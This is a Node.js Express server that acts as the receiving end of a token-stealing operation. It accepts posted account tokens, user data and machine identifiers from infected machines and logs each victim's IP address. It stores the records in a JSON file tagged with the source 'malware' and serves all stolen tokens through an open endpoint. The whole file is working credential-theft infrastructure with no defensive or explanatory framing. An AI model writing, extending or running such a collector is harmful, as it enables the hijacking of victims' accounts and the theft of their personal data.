const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('.'));

let tokensStore = [];
const logFile = path.join(__dirname, 'tokens_log.json');

try {
    if (fs.existsSync(logFile)) {
        tokensStore = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        console.log('[+] Loaded ' + tokensStore.length + ' tokens');
    }
} catch (e) {}

app.post('/api/save', (req, res) => {
    try {
        const data = req.body;
        console.log('[+] Token received from:', data.machineId || 'unknown');
        
        let userData = data.userData;
        if (typeof userData === 'string') {
            try { userData = JSON.parse(userData); } catch (e) { userData = null; }
        }

        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        console.log('[+] IP:', ip);

        if (!userData || !userData.id) {
            userData = { 
                id: 'unknown_' + Date.now(), 
                username: 'Unknown_' + data.token.substring(0, 8),
                email: 'unknown@email.com',
                verified: false
            };
        }

        const exists = tokensStore.find(t => t.userData?.id === userData?.id);
        if (!exists) {
            const entry = {
                token: data.token,
                userData: userData,
                machineId: data.machineId || 'unknown',
                ip: ip || 'unknown',
                receivedAt: new Date().toISOString(),
                source: data.source || 'malware'
            };
            tokensStore.push(entry);
            fs.writeFileSync(logFile, JSON.stringify(tokensStore, null, 2));
            console.log('[+] NEW ACCOUNT:', userData.username || 'Unknown', '| IP:', ip);
            console.log('[+] TOTAL:', tokensStore.length);
        }

        res.json({ success: true, total: tokensStore.length });
    } catch (error) {
        console.error('[-] Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/tokens', (req, res) => {
    res.json(tokensStore);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, '0.0.0.0', () => {
    console.log('');
    console.log('========================================');
    console.log('[+] SERVER RUNNING ON PORT ' + port);
    console.log('[+] Open: http://localhost:3000');
    console.log('[+] API: http://localhost:3000/api/save');
    console.log('[+] API GET: http://localhost:3000/api/tokens');
    console.log('========================================');
    console.log('');
});